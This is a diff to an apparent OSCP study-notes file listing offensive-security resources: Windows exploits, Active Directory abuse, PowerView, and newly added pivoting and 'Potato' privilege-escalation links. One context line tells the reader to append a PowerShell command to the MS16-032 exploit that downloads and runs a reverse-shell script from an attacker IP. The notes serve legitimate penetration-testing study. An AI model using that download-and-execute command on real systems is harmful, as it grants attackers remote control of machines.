@@ -12,6 +12,8 @@ TJNull's OSCP Notes - https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to
 
 [Pre-Compiled Windows Exploits for common vulns](https://github.com/abatchy17/WindowsExploits)
 
+[Pivoting and Tunnelling](https://medium.com/@kuwaitison/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022)
+
 [Abusing Active Directory ACLs and ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 
 [PowerView Cheatsheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)
@@ -42,6 +44,8 @@ TJNull's OSCP Notes - https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to
 
 [MS16-032 Exploit Script](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) 
 **note** add a line at the end `Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.10/rev.ps1')"` 
+
+[Privilege Escalation with Poato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
 
 [/etc/shadow and passwd file formats](https://www.cyberciti.biz/faq/understanding-etcshadow-file/#:~:text=The%20%2Fetc%2Fshadow%20is%20a,only%20to%20the%20root%20user.)
 
